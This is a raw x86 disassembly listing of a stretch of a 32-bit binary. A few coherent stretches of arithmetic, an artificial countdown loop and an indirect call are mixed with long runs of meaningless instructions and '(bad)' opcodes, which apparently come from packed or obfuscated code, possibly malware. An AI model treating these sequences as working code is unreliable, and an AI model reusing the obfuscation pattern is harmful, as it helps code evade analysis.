  40ea31:	mov    ebx,0x306f9d8a
  40ea36:	jnp    0x40e9e0
  40ea38:	cmc    
  40ea39:	inc    ecx
  40ea3a:	adc    dh,BYTE PTR [eax+esi*2]
  40ea3d:	push   esi
  40ea3e:	jge    0x40e9c9
  40ea40:	outs   dx,BYTE PTR ds:[esi]
  40ea41:	mov    eax,ds:0x3b83de85
  40ea46:	int3   
  40ea47:	subps  xmm4,xmm0
  40ea4a:	sbb    ah,0x12
  40ea4d:	imul   ebx,DWORD PTR ds:0xc9ae81f4,0xffffffe8
  40ea54:	pushf  
  40ea55:	rcl    BYTE PTR [edi-0x76],0xbc
  40ea59:	pop    ebx
  40ea5a:	test   DWORD PTR [esi+0x244b8f7e],edi
  40ea60:	xchg   ebx,eax
  40ea61:	and    DWORD PTR [ebx+0x71d2f244],0x52
  40ea68:	jl     0x40eada
  40ea6a:	adc    cl,bl
  40ea6c:	inc    ebp
  40ea6d:	out    0x73,eax
  40ea6f:	push   cs
  40ea70:	fdivr  DWORD PTR [ebp-0x4e02fa05]
  40ea76:	sahf   
  40ea77:	stc    
  40ea78:	aam    0x8
  40ea7a:	nop
  40ea7b:	jmp    0xc293:0xe66884cc
  40ea82:	jmp    0x714a07b
  40ea87:	vmulsd xmm7,xmm6,xmm4
  40ea8b:	xchg   esp,eax
  40ea8c:	jne    0x40eaa5
  40ea8e:	bound  edi,QWORD PTR [esi+0x2d592365]
  40ea94:	repnz dec ebp
  40ea96:	imul   ebp,DWORD PTR [bx+di-0x2fc],0xffffffd8
  40ea9c:	mov    ds:0xd354e2e4,al
  40eaa1:	ret    
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fce5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x11
  40eb8d:	sbb    eax,0xaff70c15
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb76
  40eb99:	mov    cl,0xb9
  40eb9b:	push   ecx
  40eb9c:	adc    ah,BYTE PTR [ebp-0x7f]
  40eb9f:	(bad)  
  40eba0:	(bad)  
  40eba1:	xrelease xchg BYTE PTR ds:0x6baca88e,bh
  40eba8:	fst    QWORD PTR [edi-0x16eccd57]
  40ebae:	mov    DWORD PTR [edx-0x58c8e376],eax
  40ebb4:	stos   BYTE PTR es:[edi],al
  40ebb5:	xchg   ecx,eax
  40ebb6:	mov    edi,0x17f170d2
  40ebbb:	dec    ecx
  40ebbc:	cmp    eax,DWORD PTR [ebp+0xb36e74]
  40ebc2:	imul   eax,eax,0x435ca13f
  40ebc8:	jp     0x40ec22
  40ebca:	pop    eax
  40ebcb:	rcl    DWORD PTR [esi+0x39],1
  40ebce:	sti    
  40ebcf:	jmp    0x68c355e6
  40ebd4:	cdq    
  40ebd5:	out    0xe3,eax
  40ebd7:	jmp    0x17baadde
  40ebdc:	mov    dh,0x51
  40ebde:	es adc eax,0x979d708b
  40ebe4:	lods   al,BYTE PTR ds:[esi]
  40ebe5:	jb     0x40ebea
  40ebe7:	push   0xb123ba69
  40ebec:	(bad)  
  40ebed:	jecxz  0x40ebbe
  40ebef:	push   ecx
  40ebf0:	xor    esp,0x9c4956f9
  40ebf6:	mov    ?,edi
  40ebf8:	jbe    0x40ebbb
  40ebfa:	xor    al,0xf3
  40ebfc:	add    DWORD PTR [ebx-0x5e523a65],ebx
  40ec02:	add    eax,0x841c4849
  40ec07:	mov    esp,0x226b9d0a
  40ec0c:	pop    edi
  40ec0d:	imul   ebx,DWORD PTR [ebx-0x4e84b1a8],0x56
  40ec14:	pop    es
  40ec15:	ffree  st(4)
  40ec17:	inc    ebp
  40ec18:	push   0x5b208de0
  40ec1d:	cmp    eax,0xccceff79
  40ec22:	cmp    ch,BYTE PTR [ecx-0x344ebe98]
  40ec28:	cmp    ebp,DWORD PTR [edx]
  40ec2a:	outs   dx,DWORD PTR ds:[esi]
  40ec2b:	clc    
  40ec2c:	mov    cl,dl
  40ec2e:	stc    
  40ec2f:	xchg   esp,eax
  40ec30:	inc    BYTE PTR [edx-0x4a]
  40ec33:	add    al,0xbd
  40ec35:	scas   al,BYTE PTR es:[edi]
  40ec36:	hlt    
  40ec37:	into   
  40ec38:	(bad)  
  40ec3a:	stos   DWORD PTR es:[edi],eax
  40ec3b:	sub    al,0xef
  40ec3d:	das    
  40ec3e:	or     eax,0x8c9b063a
  40ec43:	or     bh,BYTE PTR [edi+ebp*2]
  40ec46:	ins    BYTE PTR es:[edi],dx
  40ec47:	xor    al,0x95
  40ec49:	push   edx
  40ec4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec4b:	fld    DWORD PTR [ebp+0x3c17dbd]
  40ec51:	lods   eax,DWORD PTR ds:[esi]
  40ec52:	arpl   WORD PTR [edx],bx
  40ec54:	add    al,0xdb
  40ec56:	or     BYTE PTR [edx-0x39],dl
  40ec59:	dec    ebp
  40ec5a:	loopne 0x40ec66
  40ec5c:	push   cs
  40ec5d:	sbb    eax,0xef5cc8bf
  40ec62:	jmp    0x40ecad
  40ec64:	nop
  40ec65:	mov    al,BYTE PTR [ebx-0x41]
  40ec68:	sub    BYTE PTR [ecx-0x76],0x29
  40ec6c:	jecxz  0x40ec75
  40ec6e:	xchg   esi,eax
  40ec6f:	(bad)  
  40ec70:	pop    ecx
  40ec71:	jmp    0x3a589cf5
  40ec76:	sub    ecx,DWORD PTR [esi+eax*2-0xfbad7ce]
  40ec7d:	jecxz  0x40ecce
  40ec7f:	int3   
  40ec80:	aas    
  40ec81:	mov    BYTE PTR [edx],dl
  40ec83:	jle    0x40ec2b
  40ec85:	push   ss
  40ec86:	mov    esp,0x796a0a69
  40ec8b:	(bad)  
  40ec8c:	mov    dl,0x55
  40ec8e:	pop    ebx
  40ec8f:	xor    dl,BYTE PTR [edi-0x2406e644]
  40ec95:	cmp    al,0xe4
  40ec97:	mov    esp,0xa69b4f72
  40ec9c:	scas   eax,DWORD PTR es:[edi]
  40ec9d:	data16 mov dl,0x21
  40eca0:	icebp  
  40eca1:	pop    ebx
  40eca2:	jns    0x40ec81
  40eca4:	mov    ch,0xbc
  40eca6:	mov    dl,0x8d
  40eca8:	xchg   edi,eax
  40eca9:	xor    al,0x94
  40ecab:	loop   0x40ec8e
  40ecad:	(bad)  
  40ecae:	aas    
  40ecaf:	push   ds
  40ecb0:	push   ebx
  40ecb1:	and    eax,0x3c1ccd89
  40ecb6:	dec    edx
  40ecb7:	shl    DWORD PTR [eax-0x357f278d],cl
  40ecbd:	jne    0x40ec63
  40ecbf:	cmp    al,0x4f
  40ecc1:	jecxz  0x40ecaf
  40ecc3:	push   esp
  40ecc4:	(bad)  
  40ecc5:	icebp  
  40ecc6:	sar    BYTE PTR [edi],1
  40ecc8:	pop    ss
  40ecc9:	pop    edx
  40ecca:	in     eax,0x18
  40eccc:	mov    eax,0xd89dc082
  40ecd1:	fabs   
  40ecd3:	or     al,0x38
  40ecd5:	gs or  eax,0x527553bf
  40ecdb:	jns    0x40ed42
  40ecdd:	and    al,0x3a
  40ecdf:	adc    al,0xec
  40ece1:	shl    BYTE PTR [edx-0x3ec43f2e],0x8b
  40ece8:	inc    ebp
  40ece9:	in     al,dx
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ec8b
  40ed00:	vmread DWORD PTR [eax-0x46],esi
  40ed04:	scas   al,BYTE PTR es:[edi]
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed2b
  40ed0c:	les    edi,FWORD PTR [ebp+0x41]
  40ed0f:	add    BYTE PTR ds:0xc870dd7c,dh
  40ed15:	aas    
  40ed16:	out    dx,eax
  40ed17:	cmp    al,0xcb
  40ed19:	pop    edi
  40ed1a:	push   ecx
  40ed1b:	(bad)  
  40ed1c:	or     eax,0x36c15dd3
  40ed21:	cmp    BYTE PTR [edx],ch
  40ed23:	fnstenv [ebx+0x634abaab]
  40ed29:	jecxz  0x40ed2d
  40ed2b:	icebp  
  40ed2c:	ds out 0xf,al
  40ed2f:	js     0x40ed98
  40ed31:	mov    edx,0x3fd961d8
  40ed36:	inc    edx
  40ed37:	sbb    eax,0xb3f95a3
  40ed3c:	inc    ecx
  40ed3d:	repnz mov ah,0x20
  40ed40:	(bad)  
  40ed41:	and    eax,0xc3acdc4b
  40ed46:	fwait
  40ed47:	pop    ss
  40ed48:	xchg   edi,eax
  40ed49:	sub    eax,0xea113cbf
  40ed4e:	jl     0x40ed13
  40ed50:	test   DWORD PTR [ecx+0x25],esp
  40ed53:	enter  0x51b2,0x92
  40ed57:	scas   al,BYTE PTR es:[edi]
  40ed58:	pop    ecx
  40ed59:	pop    edx
  40ed5a:	add    eax,0x28da68f6
  40ed5f:	mov    esp,0x4b67b7d3
  40ed64:	dec    ebx
  40ed65:	mov    ah,0x97
  40ed67:	dec    edx
  40ed68:	add    DWORD PTR ds:0xc192467e,edx
  40ed6e:	xchg   edx,eax
  40ed6f:	popf   
  40ed70:	(bad)  
  40ed71:	fistp  WORD PTR [esi+0x2f42aca3]
  40ed77:	push   ebp
  40ed78:	xlat   BYTE PTR ds:[ebx]
  40ed79:	adc    esi,edx
  40ed7b:	(bad)  
  40ed7c:	mov    ds:0x4fc3e983,eax
  40ed81:	mov    bl,0xa4
  40ed83:	inc    ebp
  40ed84:	jb     0x40edd9
  40ed86:	jmp    0x21f4bb5d
  40ed8b:	and    BYTE PTR [ebp+0x4cd881a1],dl
  40ed91:	dec    ebp
  40ed92:	test   dl,bl
  40ed94:	les    ecx,FWORD PTR [esi-0x7c]
  40ed97:	loope  0x40edea
  40ed99:	pop    eax
  40ed9a:	dec    ebp
  40ed9b:	push   ss
  40ed9c:	daa    
  40ed9d:	in     al,0x46
  40ed9f:	sub    ah,BYTE PTR [eax-0x33]
  40eda2:	pop    ss
  40eda3:	or     bh,BYTE PTR [ebx-0x5efb6de9]
  40eda9:	mov    ebx,esi
  40edab:	outs   dx,BYTE PTR ds:[esi]
  40edac:	inc    esi
  40edad:	add    DWORD PTR [edi+esi*1-0x2d9ee10a],eax
  40edb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb5:	jae    0x40edad
  40edb7:	les    ebp,FWORD PTR [edi-0x322e14bc]
  40edbd:	sub    eax,0x4e0b8971
  40edc2:	cmp    edx,DWORD PTR ds:[eax]
  40edc5:	add    al,0xfb
  40edc7:	dec    ecx
  40edc8:	dec    ebp
  40edc9:	cmp    edi,eax
  40edcb:	repz ss test ax,0x25d9
  40edd1:	adc    BYTE PTR [eax-0x63],ch
  40edd4:	xor    DWORD PTR [ebp-0x2916c96],ecx
  40edda:	jmp    0xb3d7489d
  40eddf:	not    DWORD PTR [edx-0x76]
  40ede2:	cmp    BYTE PTR ds:0xea60b557,cl
  40ede8:	push   edx
  40ede9:	test   al,0x12
  40edeb:	in     eax,0xb
  40eded:	imul   eax,edx,0x38
  40edf0:	sub    DWORD PTR [esp+esi*1+0x7a6003e7],ecx
  40edf7:	xchg   ecx,eax
  40edf8:	jb     0x40ee0f
  40edfa:	mov    ah,0xb7
  40edfc:	cdq    
  40edfd:	mov    ebx,0xd48b296d
  40ee02:	neg    ch
  40ee04:	and    edi,DWORD PTR [esi+0x4a]
  40ee07:	out    dx,eax
  40ee08:	mov    bl,0x1c
  40ee0a:	test   DWORD PTR [ebx+0x543871df],ebp
  40ee10:	imul   ecx,DWORD PTR [esi-0x3f1c66ed],0x34
  40ee17:	pop    ecx
  40ee18:	shl    cl,cl
  40ee1a:	ss call 0xb484:0x9869f4bd
  40ee22:	pop    ebp
  40ee23:	jb     0x40ee79
  40ee25:	jl     0x40ee0e
  40ee27:	adc    ah,dl
  40ee29:	repz pushw cs
  40ee2c:	jnp    0x40ee0d
  40ee2e:	xchg   esp,eax
  40ee2f:	fisttp QWORD PTR [edi]
  40ee31:	pop    esi
  40ee32:	mov    edx,0xdc814865
  40ee37:	sbb    DWORD PTR [edx+0x4096076e],ecx
  40ee3d:	add    DWORD PTR [ebx],edi
  40ee3f:	cmp    al,0x87
  40ee41:	leave  
  40ee42:	mov    ds,WORD PTR cs:[ebx+0x6a21c0f]
  40ee49:	sbb    BYTE PTR [esi],dh
  40ee4b:	pop    ds
  40ee4c:	mov    edi,0x9f2d781b
  40ee51:	cwde   
  40ee52:	xchg   BYTE PTR [ebx],bh
  40ee54:	and    al,0xc1
  40ee56:	lock sbb DWORD PTR [edi],ecx
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x81
  40ee7f:	rcr    BYTE PTR [ebp+0x15],1
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee26
  40ee8b:	std    
  40ee8c:	aas    
  40ee8d:	inc    eax
  40ee8e:	mov    dh,BYTE PTR [esi+0x55]
  40ee91:	mov    ds:0x57cf7f34,eax
  40ee96:	ror    DWORD PTR [ebp+0x58],cl
  40ee99:	mov    bl,0xa5
  40ee9b:	pop    ebp
  40ee9c:	out    0x8a,eax
  40ee9e:	dec    ebp
  40ee9f:	out    0xe4,al
  40eea1:	mul    BYTE PTR [edx+0x33b6ae3b]
  40eea7:	dec    ebp
  40eea8:	dec    eax
  40eea9:	rcl    BYTE PTR [edi+0x776b35db],cl
  40eeaf:	push   edx
  40eeb0:	fsub   DWORD PTR [ecx+0x62c7762a]
  40eeb6:	xor    eax,DWORD PTR [esi+edx*8-0x70d9fa0d]
  40eebd:	jmp    0x6225b34b
  40eec2:	pop    es
  40eec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec4:	fwait
  40eec5:	jo     0x40eebe
  40eec7:	ja     0x40ee71
  40eec9:	push   ds
  40eeca:	popf   
  40eecb:	and    DWORD PTR [esi],esp
  40eecd:	retf   
  40eece:	mov    ds:0xdc28c9f5,eax
  40eed3:	and    ebx,DWORD PTR ds:[edx+ecx*1]
  40eed7:	ficomp WORD PTR [ebx]
  40eed9:	or     edi,DWORD PTR [ecx-0xa]
  40eedc:	test   DWORD PTR [eax+0x5737d6ff],ebp
  40eee2:	gs ja  0x40ee6f
  40eee5:	mov    esp,0x201af059
  40eeea:	lods   al,BYTE PTR ds:[esi]
  40eeeb:	dec    esi
  40eeec:	ds sub al,0xf9
  40eeef:	enter  0x1676,0x7b
  40eef3:	mov    eax,ds:0xf5fbaaec
  40eef8:	jnp    0x40ef23
  40eefa:	aad    0x12
  40eefc:	sub    al,0x49
  40eefe:	inc    edx
  40eeff:	jg     0x40ee9c
  40ef01:	fst    st(5)
  40ef03:	in     eax,0x3a
  40ef05:	int3   
  40ef06:	jns    0x40eeba
  40ef08:	xor    DWORD PTR [ebx-0x4d],0x91f90db
  40ef0f:	cld    
  40ef10:	idiv   DWORD PTR [edi+0xd]
  40ef13:	jne    0x40ef57
  40ef15:	cld    
  40ef16:	leave  
  40ef17:	push   ebx
  40ef18:	xlat   BYTE PTR ds:[ebx]
  40ef19:	fistp  WORD PTR [edx+eiz*4-0x728cfb93]
  40ef20:	das    
  40ef21:	dec    eax
  40ef22:	sub    ebp,DWORD PTR [ecx-0x6f]
  40ef25:	in     al,dx
  40ef26:	scas   al,BYTE PTR es:[edi]
  40ef27:	out    dx,eax
  40ef28:	mov    ecx,0x681084c
  40ef2d:	daa    
  40ef2e:	mov    ds:0xaa08d9c3,eax
  40ef33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef34:	fisub  DWORD PTR [edi+edi*1]
  40ef37:	push   eax
  40ef38:	xchg   esi,eax
  40ef3a:	fcom   QWORD PTR [esi-0x31d01355]
  40ef40:	inc    esp
  40ef41:	cs xchg ebp,eax
  40ef43:	ja     0x40ef95
  40ef45:	push   ecx
  40ef46:	popf   
  40ef47:	stos   BYTE PTR es:[edi],al
  40ef48:	dec    DWORD PTR ds:0x3d4b1b72
  40ef4e:	js     0x40ef0d
  40ef50:	pop    edi
  40ef51:	cwde   
  40ef52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef53:	cmp    eax,0x5473dd39
  40ef58:	mov    eax,ds:0x6082a0cb
  40ef5d:	in     eax,dx
  40ef5e:	test   ebx,0xe02edc20
  40ef64:	jno    0x40eef2
  40ef66:	mov    ecx,0xe965f3df
  40ef6b:	addr16 jo 0x40ef75
  40ef6e:	enter  0x9417,0x44
  40ef72:	loope  0x40efdc
  40ef74:	sub    dh,ah
  40ef76:	push   ebp
  40ef77:	imul   edi
  40ef79:	inc    ecx
  40ef7a:	mov    gs,WORD PTR [eax]
  40ef7c:	inc    ecx
  40ef7d:	out    0x2b,eax
  40ef7f:	psubsb mm6,mm5
  40ef82:	pop    ss
  40ef83:	and    edi,DWORD PTR gs:[ebx-0x75]
  40ef87:	sbb    DWORD PTR [ecx-0x6cb6883f],ebp
  40ef8d:	sbb    al,0x5
  40ef8f:	fld    QWORD PTR [ebx]
  40ef91:	cld    
  40ef92:	mov    al,0xa7
  40ef94:	mov    al,BYTE PTR [ecx+eax*2-0x76]
  40ef98:	fisttp WORD PTR [ebp-0x30]
  40ef9b:	lock push ebp
  40ef9d:	add    edi,eax
  40ef9f:	aaa    
  40efa0:	arpl   WORD PTR [edi-0x2b218a12],bp
  40efa6:	or     ah,BYTE PTR [esi+eax*8+0x1003b3cd]
  40efad:	inc    esp
  40efae:	fdivr  QWORD PTR [ebp+0x5cf2a0b8]
  40efb4:	dec    esi
  40efb5:	adc    edi,DWORD PTR [ebp-0x7e]
  40efb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb9:	xlat   BYTE PTR ds:[ebx]
  40efba:	outs   dx,DWORD PTR ds:[esi]
  40efbb:	ja     0x40f00e
  40efbd:	test   eax,0x99af1ee4
  40efc2:	pushf  
  40efc3:	mov    ebx,esi
  40efc5:	sub    eax,0xf00d3fb2
  40efca:	inc    ebx
  40efcb:	mov    dh,0x1e
  40efcd:	mov    DWORD PTR [edi-0x60],ebp
  40efd0:	pop    ss
  40efd1:	pushf  
  40efd2:	scas   eax,DWORD PTR es:[edi]
  40efd3:	test   al,0x6d
  40efd5:	adc    ecx,DWORD PTR [edx+0x33]
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	out    dx,eax
  40effb:	das    
  40effc:	jge    0x40efb5
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	in     al,0x8a
  40f008:	loope  0x40f087
  40f00a:	gs push ss
  40f00c:	sub    ebp,DWORD PTR [edx+ebx*2]
  40f00f:	xchg   edi,eax
  40f010:	lods   eax,DWORD PTR ds:[esi]
  40f011:	xor    esp,DWORD PTR [eax+0x6c]
  40f014:	pusha  
  40f015:	and    dh,BYTE PTR [ebx-0x7f]
  40f018:	xchg   edi,eax
  40f019:	aad    0x77
  40f01b:	mov    ecx,0xd97493d4
  40f020:	cs dec ecx
  40f022:	push   cs
  40f023:	loope  0x40efc7
  40f025:	push   0x51
  40f027:	jnp    0x40f063
  40f029:	out    0x14,al
  40f02b:	fs scas al,BYTE PTR es:[edi]
  40f02d:	mov    ebx,0xa77ffa63
  40f032:	ins    BYTE PTR es:[edi],dx
  40f033:	and    DWORD PTR [esi-0x2e],esi
  40f036:	rcl    BYTE PTR [edi-0xb],cl
  40f039:	gs (bad) 
  40f03c:	jo     0x40efd2
  40f03e:	add    al,0x27
  40f040:	xchg   edx,eax
  40f041:	mov    DWORD PTR [ebx-0x9],ebp
  40f044:	and    ch,BYTE PTR [ebx+0x78fe0253]
  40f04a:	repnz in eax,dx
  40f04c:	push   ebx
  40f04d:	je     0x40f00d
  40f04f:	call   0x4215:0xc9baeb6d
  40f056:	push   edx
  40f057:	and    BYTE PTR [edi-0x4205e2bb],bl
  40f05d:	stc    
  40f05e:	dec    esp
  40f05f:	ins    DWORD PTR es:[edi],dx
  40f060:	sahf   
  40f061:	adc    eax,0x50617a9e
  40f066:	rol    BYTE PTR [edx+0x20],0x16
  40f06a:	lds    edx,FWORD PTR [ecx-0x5c9366be]
  40f070:	int3   
  40f071:	sub    al,0xb6
  40f073:	push   ss
  40f074:	or     eax,0xd59cedd4
  40f079:	repz test BYTE PTR [ecx],al
  40f07c:	mov    ebp,0x93f36cfd
  40f081:	mov    ebx,0x4b047c1f
  40f086:	sbb    dh,BYTE PTR ds:0x375dfd8c
  40f08c:	cmp    cl,al
  40f08e:	fst    QWORD PTR [ecx+ebp*1+0x4]
  40f092:	or     DWORD PTR [edi],0x24
  40f095:	in     eax,dx
  40f096:	mov    ecx,0xa383216a
  40f09b:	ret    0xff7e
  40f09e:	xor    ebp,DWORD PTR [edi-0x74]
  40f0a1:	into   
  40f0a2:	jp     0x40f079
  40f0a4:	jae    0x40f0b1
  40f0a6:	add    BYTE PTR [ebp+0x30fd996e],0xf6
  40f0ad:	rcr    dh,0x2f
  40f0b0:	imul   eax,DWORD PTR [esi+edi*1+0xd],0x221b2acd
  40f0b8:	dec    edx
  40f0b9:	and    DWORD PTR [esp+esi*8-0x301d5625],0xde41a293
  40f0c4:	mov    BYTE PTR [edx-0x3c],ah
  40f0c7:	test   al,0x92
  40f0c9:	cmp    eax,0x87bfc578
  40f0ce:	test   DWORD PTR [eax+0x5c91a88e],esp
  40f0d4:	ret    
  40f0d5:	nop
  40f0d6:	ret    0x1a24
  40f0d9:	inc    esi
  40f0da:	enter  0x233d,0x82
  40f0de:	data16 test al,0x85
  40f0e1:	cli    
  40f0e2:	jp     0x40f163
  40f0e4:	mov    ebx,0x9d5f3b3b
  40f0e9:	xchg   DWORD PTR [edi],ecx
  40f0eb:	mov    dh,0x5c
  40f0ed:	lods   al,BYTE PTR ds:[esi]
  40f0ee:	mov    WORD PTR [edx+ebp*2+0x7e],cs
  40f0f2:	mov    edi,0x2fcd735b
  40f0f7:	lods   eax,DWORD PTR ds:[esi]
  40f0f8:	push   es
  40f0f9:	sbb    esp,DWORD PTR [edx+0x70939b99]
  40f0ff:	fwait
  40f100:	mov    dl,0x5
  40f102:	mov    ah,0x2f
  40f104:	xor    dl,al
  40f106:	pop    edx
  40f107:	lahf   
  40f108:	jecxz  0x40f11a
  40f10a:	dec    esp
  40f10b:	lea    esi,[edi+0x1acb49be]
  40f111:	mov    ds:0x4f8cdd88,eax
  40f116:	mov    DWORD PTR fs:[ebp-0x73],ebp
  40f11a:	cli    
  40f11b:	in     eax,0xc1
  40f11d:	test   dh,dh
  40f11f:	mov    al,ds:0x61be9832
  40f124:	mov    al,ds:0x10029ff1
  40f129:	pop    ds
  40f12a:	xchg   esp,eax
  40f12b:	pop    esp
  40f12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12d:	ss push eax
  40f12f:	push   0xffffff8e
  40f131:	push   0xd94fc2f8
  40f136:	ds std 
  40f138:	xor    BYTE PTR [ebx-0x607fa988],al
  40f13e:	(bad)  
  40f13f:	xlat   BYTE PTR ds:[ebx]
  40f140:	xchg   edx,eax
  40f141:	nop
  40f142:	loop   0x40f147
  40f144:	xor    DWORD PTR [ebp-0x7ba9caeb],ebp
  40f14a:	xor    eax,0x2bd3a606
  40f14f:	ret    0xb2e
  40f152:	pop    eax
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [edi+0x48],esi
  40f16f:	xrelease mov DWORD PTR [ebx-0x3c8f8f56],esp
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1ec
  40f17a:	jl     0x40f169
  40f17c:	cmp    eax,0x2e3b69f5
  40f181:	or     eax,0x46739789
  40f186:	jge    0x40f207
  40f188:	scas   eax,DWORD PTR es:[edi]
  40f189:	ins    BYTE PTR es:[edi],dx
  40f18a:	add    bl,BYTE PTR fs:[ebp+0x4f]
  40f18e:	es jle 0x40f15a
  40f191:	repz add BYTE PTR [edi],0xee
  40f195:	lahf   
  40f196:	nop
  40f197:	lods   al,BYTE PTR ds:[esi]
  40f198:	gs mov edi,0xd0981061
  40f19e:	(bad)  
  40f19f:	(bad)  
  40f1a0:	out    dx,al
  40f1a1:	cld    
  40f1a2:	loope  0x40f21f
  40f1a4:	inc    eax
  40f1a5:	in     eax,0xda
  40f1a7:	ins    BYTE PTR es:[edi],dx
  40f1a8:	pop    esp
  40f1a9:	sbb    ebx,eax
  40f1ab:	jecxz  0x40f1c1
  40f1ad:	(bad)  
  40f1ae:	xor    DWORD PTR [ecx],edx
  40f1b0:	ins    BYTE PTR es:[edi],dx
  40f1b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b2:	mov    al,ds:0xea2ddd43
  40f1b7:	test   DWORD PTR [eax],edx
  40f1b9:	inc    ecx
  40f1ba:	lock jp 0x40f1a8
  40f1bd:	es jno 0x40f17c
  40f1c0:	xchg   DWORD PTR [ebp-0x7bfc303a],edx
  40f1c6:	push   0xffffffa4
  40f1c8:	jmp    DWORD PTR [ebx+esi*4-0x1098631c]
  40f1cf:	adc    eax,0xd6a667dd
  40f1d4:	or     DWORD PTR [ecx+eax*1],edi
  40f1d7:	pop    esp
  40f1d8:	icebp  
  40f1d9:	inc    esp
  40f1da:	xor    al,0xaf
  40f1dc:	cmp    BYTE PTR [esi-0x682f5289],cl
  40f1e2:	push   ecx
  40f1e3:	stos   BYTE PTR es:[edi],al
  40f1e4:	je     0x40f178
  40f1e6:	popf   
  40f1e7:	xchg   edi,eax
  40f1e8:	push   eax
  40f1e9:	ficomp DWORD PTR [ecx-0x48c2fb6f]
  40f1ef:	call   0xc724:0x92b390b9
  40f1f6:	xor    BYTE PTR [edi],dh
  40f1f8:	js     0x40f242
  40f1fa:	add    eax,0xb3ff8b62
